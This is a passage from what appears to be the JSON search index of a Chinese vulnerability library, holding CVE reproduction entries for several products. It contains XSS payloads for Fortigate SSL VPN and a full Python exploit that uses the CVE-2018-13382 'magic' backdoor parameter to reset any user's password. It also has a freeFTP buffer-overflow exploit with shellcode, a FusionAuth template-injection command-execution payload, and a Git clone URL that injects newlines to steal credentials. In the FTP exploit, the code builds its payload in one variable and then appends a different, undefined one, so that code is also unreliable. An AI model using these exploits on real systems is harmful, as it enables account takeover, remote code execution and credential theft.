Web\u95e8\u6237\u5b58\u5728\u8de8\u7ad9\u811a\u672c\u6f0f\u6d1e\u3002\u8be5\u6f0f\u6d1e\u6e90\u4e8eWEB\u5e94\u7528\u7f3a\u5c11\u5bf9\u5ba2\u6237\u7aef\u6570\u636e\u7684\u6b63\u786e\u9a8c\u8bc1\u3002\u653b\u51fb\u8005\u53ef\u5229\u7528\u8be5\u6f0f\u6d1e\u6267\u884c\u5ba2\u6237\u7aef\u4ee3\u7801\u3002</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/Fortigate%20SSL%20VPN/Fortigate%20SSL%20VPN%E5%A4%9A%E4%B8%AA%E6%BC%8F%E6%B4%9E/#_6","title":"\u6f0f\u6d1e\u5f71\u54cd","text":"<p>Fortinet Fortios 6.2 Fortinet Fortios 6.0.5 Fortinet Fortios 5.6.8</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/Fortigate%20SSL%20VPN/Fortigate%20SSL%20VPN%E5%A4%9A%E4%B8%AA%E6%BC%8F%E6%B4%9E/#_7","title":"\u590d\u73b0\u8fc7\u7a0b","text":"<pre><code>/remote/error?errmsg=ABABAB--%3E%3Cscript%3Ealert(1)%3C/script%3E\n/remote/loginredir?redir=6a6176617363726970743a616c65727428646f63756d656e742e646f6d61696e29\n/message?title=x&amp;msg=%26%23&lt;svg/onload=alert(1)&gt;;\n</code></pre>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/Fortigate%20SSL%20VPN/Fortigate%20SSL%20VPN%E5%A4%9A%E4%B8%AA%E6%BC%8F%E6%B4%9E/#cve-2018-13382-fortinet-fortios-magic","title":"CVE-2018-13382 Fortinet FortiOS magic\u540e\u95e8","text":""},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/Fortigate%20SSL%20VPN/Fortigate%20SSL%20VPN%E5%A4%9A%E4%B8%AA%E6%BC%8F%E6%B4%9E/#_8","title":"\u6f0f\u6d1e\u7b80\u4ecb","text":"<p>Fortinet  FortiOS\u662f\u7f8e\u56fd\u98de\u5854\uff08Fortinet\uff09\u516c\u53f8\u7684\u4e00\u5957\u4e13\u7528\u4e8eFortiGate\u7f51\u7edc\u5b89\u5168\u5e73\u53f0\u4e0a\u7684\u5b89\u5168\u64cd\u4f5c\u7cfb\u7edf\u3002\u8be5\u7cfb\u7edf\u4e3a\u7528\u6237\u63d0\u4f9b\u9632\u706b\u5899\u3001\u9632\u75c5\u6bd2\u3001IPSec/SSLVPN\u3001Web\u5185\u5bb9\u8fc7\u6ee4\u548c\u53cd\u5783\u573e\u90ae\u4ef6\u7b49\u591a\u79cd\u5b89\u5168\u529f\u80fd\u3002 Fortinet FortiOS 6.0.0\u7248\u672c\u81f36.0.4\u7248\u672c \u30015.6.0\u7248\u672c\u81f35.6.8\u7248\u672c\u548c5.4.1\u7248\u672c\u81f35.4.10\u7248\u672c\u4e2d\u7684SSL VPN Web\u95e8\u6237\u5b58\u5728\u6388\u6743\u95ee\u9898\u6f0f\u6d1e\u3002\u8be5\u6f0f\u6d1e\u6e90\u4e8e\u7f51\u7edc\u7cfb\u7edf\u6216\u4ea7\u54c1\u4e2d\u7f3a\u5c11\u8eab\u4efd\u9a8c\u8bc1\u63aa\u65bd\u6216\u8eab\u4efd\u9a8c\u8bc1\u5f3a\u5ea6\u4e0d\u8db3\u3002</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/Fortigate%20SSL%20VPN/Fortigate%20SSL%20VPN%E5%A4%9A%E4%B8%AA%E6%BC%8F%E6%B4%9E/#_9","title":"\u6f0f\u6d1e\u5f71\u54cd","text":"<p>Fortinet Fortios 6.2 Fortinet Fortios 6.0.5 Fortinet Fortios 5.6.9 Fortinet Fortios 5.4.11</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/Fortigate%20SSL%20VPN/Fortigate%20SSL%20VPN%E5%A4%9A%E4%B8%AA%E6%BC%8F%E6%B4%9E/#_10","title":"\u590d\u73b0\u8fc7\u7a0b","text":"<p>\u767b\u5f55\u9875\u9762\u4e2d\u5b58\u5728\u7279\u6b8a\u53c2\u6570magic\uff0c\u4e00\u65e6\u8fd9\u4e2a\u53c2\u6570\u4e3a\u67d0\u4e2a\u7279\u6b8a\u5b57\u7b26\u4e32\uff0c\u5c31\u53ef\u4ee5\u4fee\u6539\u4efb\u610f\u7528\u6237\u5bc6\u7801\u3002</p> <p>\u53ef\u4f7f\u7528POC\u76f4\u63a5\u8fdb\u884c\u4fee\u6539\u3002</p> <p></p> <pre><code>import requests, binascii, optparse, sys\nfrom urlparse import urlparse\nfrom requests.packages.urllib3.exceptions import InsecureRequestWarning\nrequests.packages.urllib3.disable_warnings(InsecureRequestWarning)\nrequests.packages.urllib3.disable_warnings()\nimport multiprocessing\nimport colored\nfrom user_agent import generate_user_agent, generate_navigator\nbold=True\nuserAgent=generate_user_agent()\nusername=\"\"\nnewpassword=\"\"\nip=\"\"\ndef setColor(message, bold=False, color=None, onColor=None):\n    from termcolor import colored, cprint\n    retVal = colored(message, color=color, on_color=onColor, attrs=(\"bold\",))\n    return retVal\ndef checkIP(ip):\n    try:\n        url = \"https://\"+ip+\"/remote/login?lang=en\"\n        headers = {\"User-Agent\": userAgent, \"Accept\": \"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\", \"Accept-Language\": \"en-US,en;q=0.5\", \"Accept-Encoding\": \"gzip, deflate\", \"Connection\": \"close\", \"Upgrade-Insecure-Requests\": \"1\"}\n        r=requests.get(url, headers=headers, verify=False)\n        if r.status_code==200 and \"&lt;title&gt;Please Login&lt;/title&gt;\" in r.text:\n            return True\n        else:\n            return False\n    except requests.exceptions.ConnectionError as e:\n        print e\n        return False\ndef changePassword(ip,username,newpassword):\n    url = \"https://\"+ip+\"/remote/logincheck\"\n    headers = {\"User-Agent\": userAgent, \"Accept\": \"*/*\", \"Accept-Language\": \"en-US,en;q=0.5\", \"Accept-Encoding\": \"gzip, deflate\", \"Referer\": \"https://\"+ip+\"/remote/login?lang=en\", \"Pragma\": \"no-cache\", \"Cache-Control\": \"no-store, no-cache, must-revalidate\", \"If-Modified-Since\": \"Sat, 1 Jan 2000 00:00:00 GMT\", \"Content-Type\": \"text/plain;charset=UTF-8\", \"Connection\": \"close\"}\n    data = {\"ajax\": \"1\", \"username\": username, \"realm\": '', \"credential\": newpassword, \"magic\": \"4tinet2095866\", \"reqid\": \"0\", \"credential2\": newpassword}\n    r=requests.post(url, headers=headers, data=data, verify=False)\n    if r.status_code==200 and 'redir=/remote/hostcheck_install' in r.text:\n        return True\n    else:\n        return False\ndef testLogin(ip,username,newpassword):\n    url = \"https://\"+ip+\"/remote/logincheck\"\n    headers = {\"User-Agent\": userAgent, \"Accept\": \"*/*\", \"Accept-Language\": \"en-US,en;q=0.5\", \"Accept-Encoding\": \"gzip, deflate\", \"Referer\": \"https://\"+ip+\"/remote/login?lang=en\", \"Pragma\": \"no-cache\", \"Cache-Control\": \"no-store, no-cache, must-revalidate\", \"If-Modified-Since\": \"Sat, 1 Jan 2000 00:00:00 GMT\", \"Content-Type\": \"text/plain;charset=UTF-8\", \"Connection\": \"close\"}\n    data = {\"ajax\": \"1\", \"username\": username, \"realm\": '', \"credential\": newpassword}\n    r=requests.post(url, headers=headers, data=data, verify=False)\n    if r.status_code==200 and\"redir=/remote/hostcheck_install\" in r.text:\n            return True\n    else:\n        return False\nparser = optparse.OptionParser()\nparser.add_option('-i', action=\"store\", dest=\"ip\", help=\"e.g. 127.0.0.1:10443\")\nparser.add_option('-u', action=\"store\", dest=\"username\")\nparser.add_option('-p', action=\"store\", dest=\"password\")\noptions, remainder = parser.parse_args()\nif not options.username or not options.password or not options.ip:\n    print \"[!] Please provide the ip (-i), username (-u) and password (-p)\"\n    sys.exit()\nif options.username:\n    username=options.username\nif options.password:\n    newpassword=options.password\nif options.ip:\n    ip=options.ip\ntmpStatus=checkIP(ip)\nif tmpStatus==True:\n    print \"[*] Checking if target is a Fortigate device \"+setColor(\" [OK]\", bold, color=\"green\")\n    if changePassword(ip,username,newpassword)==True:\n        print \"[*] Using the magic keyword to change password for: [\"+username+\"]\"+setColor(\" [OK]\", bold, color=\"green\")   \n        if testLogin(ip,username,newpassword)==True:\n            print \"[*] Testing new credentials [\"+username+\"|\"+newpassword+\"] \"+setColor(\" [OK]\", bold, color=\"green\")\n            print \"************** Enjoy your new credentials **************\"\n        else:\n            print \"[*] Testing new credentials [\"+username+\"|\"+newpassword+\"] \"+setColor(\" [NOK]\", bold, color=\"red\")\n    else:\n        print \"[*] Using the magic keyword to change password for: [\"+username+\"]\"+setColor(\" [NOK]\", bold, color=\"red\")            \nelse:\n    print \"[*] Checking if target is a Fortigate device \"+setColor(\" [NOK]\", bold, color=\"red\")\n</code></pre>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/FreeFtp/freeFTP1.0.8-%27PASS%27%E8%BF%9C%E7%A8%8B%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/","title":"freeFTP1.0.8 'PASS'\u8fdc\u7a0b\u7f13\u51b2\u533a\u6ea2\u51fa","text":""},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/FreeFtp/freeFTP1.0.8-%27PASS%27%E8%BF%9C%E7%A8%8B%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/#freeftp108-pass","title":"freeFTP1.0.8-'PASS'\u8fdc\u7a0b\u7f13\u51b2\u533a\u6ea2\u51fa","text":""},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/FreeFtp/freeFTP1.0.8-%27PASS%27%E8%BF%9C%E7%A8%8B%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/#poc","title":"POC","text":"<pre><code># Exploit Title: freeFTP 1.0.8 - Remote Buffer Overflow\n# Date: 2019-09-01\n# Author: Chet Manly\n# Software Link: https://download.cnet.com/FreeFTP/3000-2160_4-10047242.html\n# Version: 1.0.8\n# CVE: N/A\n\nfrom ftplib import FTP\n\nbuf =  \"\"\nbuf += \"\\x89\\xe1\\xdb\\xdf\\xd9\\x71\\xf4\\x5e\\x56\\x59\\x49\\x49\\x49\"\nbuf += \"\\x49\\x49\\x49\\x49\\x49\\x49\\x49\\x43\\x43\\x43\\x43\\x43\\x43\"\nbuf += \"\\x37\\x51\\x5a\\x6a\\x41\\x58\\x50\\x30\\x41\\x30\\x41\\x6b\\x41\"\nbuf += \"\\x41\\x51\\x32\\x41\\x42\\x32\\x42\\x42\\x30\\x42\\x42\\x41\\x42\"\nbuf += \"\\x58\\x50\\x38\\x41\\x42\\x75\\x4a\\x49\\x69\\x6c\\x48\\x68\\x6d\"\nbuf += \"\\x52\\x57\\x70\\x75\\x50\\x63\\x30\\x51\\x70\\x6c\\x49\\x38\\x65\"\nbuf += \"\\x64\\x71\\x79\\x50\\x31\\x74\\x6e\\x6b\\x52\\x70\\x44\\x70\\x4e\"\nbuf += \"\\x6b\\x66\\x32\\x44\\x4c\\x6c\\x4b\\x30\\x52\\x57\\x64\\x4c\\x4b\"\nbuf += \"\\x43\\x42\\x64\\x68\\x36\\x6f\\x58\\x37\\x32\\x6a\\x55\\x76\\x36\"\nbuf += \"\\x51\\x79\\x6f\\x6c\\x6c\\x77\\x4c\\x61\\x71\\x43\\x4c\\x63\\x32\"\nbuf += \"\\x56\\x4c\\x47\\x50\\x6b\\x71\\x5a\\x6f\\x34\\x4d\\x45\\x51\\x6f\"\nbuf += \"\\x37\\x68\\x62\\x6a\\x52\\x76\\x32\\x70\\x57\\x4c\\x4b\\x73\\x62\"\nbuf += \"\\x44\\x50\\x4c\\x4b\\x72\\x6a\\x77\\x4c\\x6c\\x4b\\x72\\x6c\\x57\"\nbuf += \"\\x61\\x52\\x58\\x49\\x73\\x47\\x38\\x33\\x31\\x68\\x51\\x66\\x31\"\nbuf += \"\\x6c\\x4b\\x31\\x49\\x55\\x70\\x47\\x71\\x69\\x43\\x6c\\x4b\\x72\"\nbuf += \"\\x69\\x32\\x38\\x39\\x73\\x64\\x7a\\x63\\x79\\x4c\\x4b\\x37\\x44\"\nbuf += \"\\x6c\\x4b\\x66\\x61\\x4a\\x76\\x35\\x61\\x39\\x6f\\x6c\\x6c\\x6f\"\nbuf += \"\\x31\\x68\\x4f\\x54\\x4d\\x33\\x31\\x78\\x47\\x35\\x68\\x49\\x70\"\nbuf += \"\\x30\\x75\\x49\\x66\\x45\\x53\\x51\\x6d\\x49\\x68\\x37\\x4b\\x73\"\nbuf += \"\\x4d\\x61\\x34\\x71\\x65\\x6d\\x34\\x36\\x38\\x4c\\x4b\\x32\\x78\"\nbuf += \"\\x65\\x74\\x66\\x61\\x6a\\x73\\x65\\x36\\x4c\\x4b\\x74\\x4c\\x30\"\nbuf += \"\\x4b\\x4c\\x4b\\x51\\x48\\x57\\x6c\\x75\\x51\\x6a\\x73\\x6c\\x4b\"\nbuf += \"\\x53\\x34\\x6e\\x6b\\x43\\x31\\x4a\\x70\\x4d\\x59\\x53\\x74\\x66\"\nbuf += \"\\x44\\x55\\x74\\x53\\x6b\\x31\\x4b\\x63\\x51\\x36\\x39\\x62\\x7a\"\nbuf += \"\\x62\\x71\\x69\\x6f\\x6d\\x30\\x71\\x4f\\x51\\x4f\\x71\\x4a\\x4e\"\nbuf += \"\\x6b\\x62\\x32\\x6a\\x4b\\x6e\\x6d\\x53\\x6d\\x70\\x6a\\x47\\x71\"\nbuf += \"\\x4c\\x4d\\x4e\\x65\\x4c\\x72\\x53\\x30\\x65\\x50\\x47\\x70\\x66\"\nbuf += \"\\x30\\x30\\x68\\x65\\x61\\x4c\\x4b\\x32\\x4f\\x4c\\x47\\x6b\\x4f\"\nbuf += \"\\x69\\x45\\x4d\\x6b\\x6c\\x30\\x48\\x35\\x4e\\x42\\x71\\x46\\x52\"\nbuf += \"\\x48\\x59\\x36\\x4a\\x35\\x4d\\x6d\\x6d\\x4d\\x79\\x6f\\x38\\x55\"\nbuf += \"\\x47\\x4c\\x33\\x36\\x53\\x4c\\x56\\x6a\\x6f\\x70\\x49\\x6b\\x6b\"\nbuf += \"\\x50\\x73\\x45\\x37\\x75\\x6d\\x6b\\x31\\x57\\x46\\x73\\x63\\x42\"\nbuf += \"\\x72\\x4f\\x43\\x5a\\x45\\x50\\x56\\x33\\x4b\\x4f\\x48\\x55\\x55\"\nbuf += \"\\x33\\x35\\x31\\x32\\x4c\\x53\\x53\\x66\\x4e\\x55\\x35\\x72\\x58\"\nbuf += \"\\x45\\x35\\x53\\x30\\x41\\x41\"\n\nbuf = 'A' * 276\nbuf += '\\x90' * 10\nbuf += shellcode\nbuf += 'B' * (486 - len(shellcode))\nbuf += '\\x58' # pop eax\nbuf += '\\xfe\\xcc' # dec ah\nbuf += '\\xfe\\xcc' # dec ah\nbuf += '\\xff\\xe0' # jmp eax\nbuf += 'C' * 4\nbuf += '\\xe8\\xf0\\xff\\xff\\xff' # call near\nbuf += 'D' * 9\nbuf += '\\xeb\\xf0\\x90\\x90' # jump backwards\nbuf += '\\xc0\\x3d\\x42\\x00' # 0x00423dc0 - pop, pop, ret\nbuf += 'E' * (1000 - len(buf))\nftp = FTP()\nftp.connect('192.168.1.1', 21)\nftp.login('anonymous', buf)\n</code></pre>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/FusionAuth/FusionAuthRCE%28CVE-2020-7799%29/","title":"\u7b80\u4ecb","text":"<p>FusionAuth\u662f\u4e00\u4e2a\u514d\u8d39\u7684\u8eab\u4efd\u7ba1\u7406\u5e73\u53f0\uff0c\u5b89\u88c5\u7b80\u5355\uff0c\u6613\u4e8e\u96c6\u6210\u3002FusionAuth\u63d0\u4f9b\u767b\u5f55\u3001\u6ce8\u518c\u3001MFA\u3001SSO\u3001\u7535\u5b50\u90ae\u4ef6\u6a21\u677f\u3001\u672c\u5730\u5316\u3001\u5bc6\u7801\u63a7\u5236\u3001\u5f3a\u54c8\u5e0c\u3001\u7f51\u7edc\u6302\u94a9\u3001\u57fa\u4e8e\u89d2\u8272\u7684\u8bbf\u95ee\u63a7\u5236\u7b49\u529f\u80fd\u3002</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/FusionAuth/FusionAuthRCE%28CVE-2020-7799%29/#_2","title":"\u5f71\u54cd\u7248\u672c","text":"<p>FusionAuth &lt;= 1.11.0</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/FusionAuth/FusionAuthRCE%28CVE-2020-7799%29/#_3","title":"\u73af\u5883\u642d\u5efa","text":"<p>\u4e0b\u8f7d FusionAuth 1.10.0</p> <pre><code>wget https://storage.googleapis.com/inversoft_products_j098230498/products/fusionauth/1.10.0/fusionauth-app-1.10.0.zip\n</code></pre> <p></p> <pre><code>wget https://www.elastic.co/cn/downloads/past-releases/elasticsearch-6-8-6\n</code></pre> <p>\u542f\u52a8 MySQL /etc/init.d/mysql start</p> <p>\u542f\u52a8 ElasticSearch systemctl start elasticsearch.service</p> <p>\u542f\u52a8 FusionAuth bin/startup.sh</p> <p></p> <p></p> <p>http://Your-ip:9011\u6253\u5f00\u7f51\u7ad9</p> <p></p> <p>\u914d\u7f6e FusionAuth</p> <p></p> <p>\u914d\u7f6e Elastic Search</p> <p></p> <p></p> <p></p> <p></p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/FusionAuth/FusionAuthRCE%28CVE-2020-7799%29/#_4","title":"\u6f0f\u6d1e\u590d\u73b0","text":"<p>\u8fdb\u5165 setting -&gt; email template</p> <p>\u7136\u540e\u7f16\u8f91</p> <p></p> <p>\u70b9\u51fb Preview,\u6293\u5305</p> <p></p> <pre><code>\u4fee\u6539\n\n\n\nemailTemplate.defaultHtmlTemplate\n\n\n\n\u4e3a\n\n\n\n${\"freemarker.template.utility.Execute\"?new()(\"id\")}\n</code></pre> <p></p> <p></p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/FusionAuth/FusionAuthRCE%28CVE-2020-7799%29/#_5","title":"\u4fee\u590d\u5efa\u8bae","text":"<p>\u5347\u7ea7\u5230\u6700\u65b0\u7248</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/Git/Git%E5%87%AD%E8%AF%81%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2020-5260%EF%BC%89/","title":"Git\u51ed\u8bc1\u6cc4\u9732\u6f0f\u6d1e\uff08CVE-2020-5260\uff09","text":"","tags":["\u767d\u9601-\u6f0f\u6d1e\u5e93"]},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/Git/Git%E5%87%AD%E8%AF%81%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2020-5260%EF%BC%89/#_1","title":"\u63cf\u8ff0","text":"<p>Git\u4f7f\u7528\u51ed\u8bc1\u52a9\u624b(credential helper)\u6765\u5e2e\u52a9\u7528\u6237\u5b58\u50a8\u548c\u68c0\u7d22\u51ed\u8bc1\u3002\u4f46\u662f\u5f53\u4e00\u4e2aURL\u4e2d\u5305\u542b\u7ecf\u8fc7\u7f16\u7801\u7684\u6362\u884c\u7b26\u65f6\uff0c\u53ef\u80fd\u5c06\u975e\u9884\u671f\u7684\u503c\u6ce8\u5165\u5230credential helper\u7684\u534f\u8bae\u6d41\u4e2d\u3002\u8fd9\u5c06\u4f7f\u6076\u610fURL\u6b3a\u9a97Git\u5ba2\u6237\u7aef\u53bb\u5411\u653b\u51fb\u8005\u53d1\u9001\u4e3b\u673a\u51ed\u636e\u3002\u5f53\u4f7f\u7528\u53d7\u5f71\u54cd\u7248\u672c Git\u5bf9\u6076\u610f URL \u6267\u884c git clone \u547d\u4ee4\u65f6\u4f1a\u89e6\u53d1\u8be5\u6f0f\u6d1e\u3002</p>","tags":["\u767d\u9601-\u6f0f\u6d1e\u5e93"]},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/Git/Git%E5%87%AD%E8%AF%81%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2020-5260%EF%BC%89/#_2","title":"\u5f71\u54cd\u7248\u672c","text":"<p>Git2.17.x &lt;= 2.17.3Git2.18.x &lt;= 2.18.2Git2.19.x &lt;= 2.19.3Git2.20.x &lt;= 2.20.2Git2.21.x &lt;= 2.21.1Git2.22.x &lt;= 2.22.2Git2.23.x &lt;= 2.23.1Git2.24.x &lt;= 2.24.1Git2.25.x &lt;= 2.25.2Git2.26.x &lt;= 2.26.0 poc \u94fe\u63a5\uff1ahttps://pan.baidu.com/s/1upYlyZFZMDuNZ5YnMnrmaQ \u63d0\u53d6\u7801\uff1ae9iz \u542f\u52a8poc\uff1ago run poc.go git\u5728\u6267\u884c\u7c7b\u4f3c\"git clone https://example.com\" \u8fd9\u6837\u7684\u547d\u4ee4\u65f6,\u4f1a\u8bf7\u6c42\u4f7f\u7528\u534f\u8bae\"https\"\u5b58\u50a8\u4e3b\u673a\"example.com\"\u7684\u51ed\u636e\uff0c\u5e76\u5728\u8fdc\u7a0b\u7aef\u8bf7\u6c42\u8eab\u4efd\u9a8c\u8bc1\u65f6\u5c06\u8fd4\u56de\u7684\u51ed\u636e\u9644\u52a0\u5230\u53d1\u51fa\u7684\u8bf7\u6c42\u4e2d</p> <p><code>git clone 'http://localhost:8088/%0ahost=github.com%0aprotocol=https'</code></p> <p> </p> <p>\u83b7\u53d6\u5230git\u7684\u51ed\u8bc1</p>","tags":["\u767d\u9601-\u6f0f\u6d1e\u5e93"]},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/Git/Git%E5%87%AD%E8%AF%81%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2020-5260%EF%BC%89/#_3","title":"\u4fee\u590d\u5efa\u8bae","text":"<p>\u5347\u7ea7\u5230\u6700\u65b0\u7248</p>","tags":["\u767d\u9601-\u6f0f\u6d1e\u5e93"]},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/Gitlab%20CEEE/Gitlab%20CEEE%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E5%AF%BC%E8%87%B4%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%28CVE-2020-10977%29/","title":"Gitlab CEEE\u4efb\u610f\u6587\u4ef6\u8bfb\u53d6\u5bfc\u81f4\u8fdc\u7a0b\u547d\u4ee4\u6267\u884c\u6f0f\u6d1e(CVE 2020 10977)","text":""},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/Gitlab%20CEEE/Gitlab%20CEEE%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E5%AF%BC%E8%87%B4%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%28CVE-2020-10977%29/#_1","title":"\u6f0f\u6d1e\u7b80\u4ecb","text":"<p>\u5728Gitlab 8.5-12.9\u7248\u672c\u4e2d\uff0c\u5b58\u5728\u4e00\u5904\u4efb\u610f\u6587\u4ef6\u8bfb\u53d6\u6f0f\u6d1e\uff0c\u653b\u51fb\u8005\u53ef\u4ee5\u5229\u7528\u8be5\u6f0f\u6d1e\uff0c\u5728\u4e0d\u9700\u8981\u7279\u6743\u7684\u72b6\u6001\u4e0b\uff0c\u8bfb\u53d6\u4efb\u610f\u6587\u4ef6\uff0c\u9020\u6210\u4e25\u91cd\u4fe1\u606f\u6cc4\u9732\uff0c\u4ece\u800c\u5bfc\u81f4\u8fdb\u4e00\u6b65\u88ab\u653b\u51fb\u7684\u98ce\u9669</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/Gitlab%20CEEE/Gitlab%20CEEE%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E5%AF%BC%E8%87%B4%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%28CVE-2020-10977%29/#_2","title":"\u5f71\u54cd\u7248\u672c","text":"<p>GitLab GitLab CE/EE &gt;=8.5 and &lt;=12.9</p> <p>GitLab GitLab CE &gt;=8.5\uff0c&lt;=12.9</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/Gitlab%20CEEE/Gitlab%20CEEE%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E5%AF%BC%E8%87%B4%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%28CVE-2020-10977%29/#poc","title":"POC\u5730\u5740\uff1a","text":"<pre><code>https://github.com/thewhiteh4t/cve-2020-10977\n</code></pre>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/Gitlab%20CEEE/Gitlab%20CEEE%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E5%AF%BC%E8%87%B4%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%28CVE-2020-10977%29/#_3","title":"\u4fee\u590d\u5efa\u8bae","text":"<p>1.\u5efa\u8bae\u5728\u5b98\u7f51\u5347\u7ea7\u81f3\u6700\u65b0\u7248\u672c</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/Harbor/CVE-2019-16097/","title":"CVE-2019-16097-batch","text":""},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/Harbor/CVE-2019-16097/#_1","title":"\u514d\u8d23\u58f0\u660e","text":"<p>\u53ea\u505a\u5b89\u5168\u7814\u7a76\u4f7f\u7528\uff0c\u4e0d\u5f97\u505a\u975e\u6cd5\u6d4b\u8bd5\uff0c\u540e\u679c\u81ea\u884c\u627f\u62c5\uff01\uff01\uff01</p> <p>CVE-2019-16097-batch</p> <p>\u6279\u91cf\u6f0f\u6d1e\u5229\u7528\u811a\u672c</p> <p>\u5728 url.txt\u6587\u4ef6 \u6279\u91cf\u6dfb\u52a0\u76ee\u6807\u5730\u5740</p> <p>http://1.1.1.1 http://2.2.2.2</p> <p>\u4f7f\u7528python \u8fd0\u884c \u6b64\u811a\u672c \u5728 result.txt \u53ef\u4ee5\u770b\u5230\u6700\u7ec8\u7684\u9a8c\u8bc1\u7ed3\u679c</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/Harbor/CVE-2019-16097/#_2","title":"\u6f0f\u6d1e\u80cc\u666f","text":"<p>\u8fd1\u65e5\uff0c\u955c\u50cf\u4ed3\u5e93Harbor\u7206\u51fa\u4efb\u610f\u7ba1\u7406\u5458\u6ce8\u518c\u6f0f\u6d1e\uff0c\u653b\u51fb\u8005\u5728\u8bf7\u6c42\u4e2d\u6784\u9020\u7279\u5b9a\u5b57\u7b26\u4e32\uff0c\u5728\u672a\u6388\u6743\u7684\u60c5\u51b5\u4e0b\u53ef\u4ee5\u76f4\u63a5\u521b\u5efa\u7ba1\u7406\u5458\u8d26\u53f7\uff0c\u4ece\u800c\u63a5\u7ba1Harbor\u955c\u50cf\u4ed3\u5e93\u3002\u6211\u4eec\u5f97\u5230\u6d88\u606f\uff0c\u7b2c\u4e00\u65f6\u95f4\u5bf9\u8be5\u6f0f\u6d1e\u8fdb\u4e86\u9a8c\u8bc1\uff0c\u5b98\u65b9\u5df2\u53d1\u5e03\u516c\u544a\u8bf4\u660e\uff0c\u6700\u65b0\u76841.7.6\u548c1.8.3\u5df2\u4fee\u590d\u6b64\u6f0f\u6d1e\uff0c\u8b